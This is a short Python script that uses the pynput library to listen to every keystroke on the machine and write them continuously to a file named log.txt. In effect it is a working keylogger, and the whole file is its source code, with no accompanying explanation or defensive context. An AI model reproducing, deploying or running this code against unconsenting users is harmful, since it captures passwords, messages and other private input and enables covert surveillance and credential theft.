import pynput
from pynput.keyboard import Key , Listener

keys = []

def write_file(keys):
    with open('log.txt' , 'w') as f :
        for key in keys:
            k = str(key).replace("'","")
            if k == "Key.enter":
                f.write("\n")
            elif k == "Key.space":
                f.write(" ")
            else:
                f.write(k)

def on_press(key):
    keys.append(key)
    write_file(keys)

with Listener(on_press = on_press) as listener:
    listener.join()